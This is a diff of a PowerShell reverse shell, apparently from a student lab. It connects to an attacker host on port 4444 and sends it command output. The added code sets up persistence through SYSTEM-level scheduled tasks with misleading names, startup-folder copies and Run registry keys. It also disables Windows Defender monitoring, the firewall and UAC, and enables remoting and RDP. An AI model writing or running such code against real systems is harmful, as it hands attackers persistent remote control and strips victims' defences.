@@ -1,6 +1,10 @@
 ﻿#jimmy mcgovern
 #reverse shell
 
+#$scriptPath = "C:\Users\student\Documents\reverseShell.ps1"
+$scriptPath = Join-Path -path $PSScriptRoot -ChildPath reverseShell.ps1
+
+Start-Sleep -Seconds 15
 #establishes connection to kali box
 #.tcpClient takes string attackerip, portnumber
 $client = New-Object System.Net.Sockets.TcpClient("192.168.192.32", 4444)
@@ -16,28 +20,60 @@ $writer.AutoFlush = $true
 #all the commands the attacker can run    
 $writer.WriteLine((Get-Command | Out-String))
 
-#persistence
-#$scriptPath = "C:\Users\student\Documents\reverseShell.ps1"
-$scriptPath = $PSScriptRoot
+$writer.WriteLine($scriptPath)
+
+#initializing scheduledtask shit
+$trigger = New-ScheduledTaskTrigger -AtLogOn
+$trigger.Repetition = (New-ScheduledTaskTrigger -Once -At "12am" -RepetitionInterval (New-TimeSpan -Minutes 5)).repetition
+$taskPrincipal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount:3
+#bypass execution policy for the script
+Set-ExecutionPolicy Bypass -Scope Process
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $scriptPath -Force"
+Register-ScheduledTask -Action $action -Trigger $trigger -Principal $taskPrincipal -TaskName "windows_important_task" -Settings $settings -Force
+
+#lowering security
+
+#disable realtimemonitoring
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Set-MpPreference -DisableRealTimeMonitoring $True"
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MpPreference" -Principal $taskPrincipal -Settings $settings -Force
+#set executionPolicy to unrestricted
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Set-ExecutionPolicy Unrestricted -Scope Process -Force"
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "executionPolicy" -Principal $taskPrincipal -Settings $settings -Force
+#turn off firewall
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False -Force"
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Firewall" -Principal $taskPrincipal -Settings $settings -Force
+#enable powershell remoting
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Enable-PSRemoting -Force"
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsExecPSRemoting" -Principal $taskPrincipal -Settings $settings -Force
+#enable rdp
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0"
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Firewall" -Principal $taskPrincipal -Settings $settings -Force
+#disable UAC 
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0"
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Firewall" -Principal $taskPrincipal -Settings $settings -Force
+
 $taskName = "windows_reverse_tool"
 
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $scriptPath"
-$trigger = New-ScheduledTaskTrigger -AtStartup
-
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteriesRunning $true -DontStopIfGoingOnBatteries $true -StartWhenAvailable $true
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Settings $settings -User "SYSTEM" -RunLevel Highest
-
-
-#duplicate self to system32
-Copy-Item -Path $scriptPath -Destination "C:\Windows\System32\reverseShell.ps1"
-Copy-Item -Path $scriptPath -Destination "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1"
+#duplicate self
+if (-not (Test-Path -path "C:\Windows\System32\reverseShell.ps1")){
+    Copy-Item -Path $scriptPath -Destination "C:\Windows\System32\reverseShell.ps1" -Force
+}
+#if (-not (Test-Path -path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1")){
+#    Copy-Item -Path $scriptPath -Destination "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1" -Force
+#}
 $userName = (Get-WmiObject -Class Win32_ComputerSystem).UserName
-Copy-Item -Path $scriptPath -Destination "C:\Users\$userName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1"
+if (-not (Test-Path -path "C:\Users\$userName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1")){
+    Copy-Item -Path $scriptPath -Destination "C:\Users\$userName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\reverseShell.ps1" -Force
+}
 
-#more persistence
-New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-File C:\Windows\System32\reverseShell.ps1") -Trigger $trigger -TaskName "Windows_System32_bigdawg"
-Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "gawdDAMN" -Value "C:\Windows\System32\reverseShell.ps1"
+#reruns the file every minute
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File $scriptPath"
+$trigger.Repetition = (New-ScheduledTaskTrigger -Once -At "12am" -RepetitionInterval (New-TimeSpan -Minutes 1)).repetition
+Register-ScheduledTask -Action $action -Trigger $trigger -Principal $taskPrincipal -TaskName "sheldon" -Settings $settings -Force
+#makes sure the file is run every login
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "windowsImportantDawgWalking" -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \Start-Process powershell.exe -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File $scriptPath -Verb RunAs\"
 
 #infinite loop
 while ($true) { 
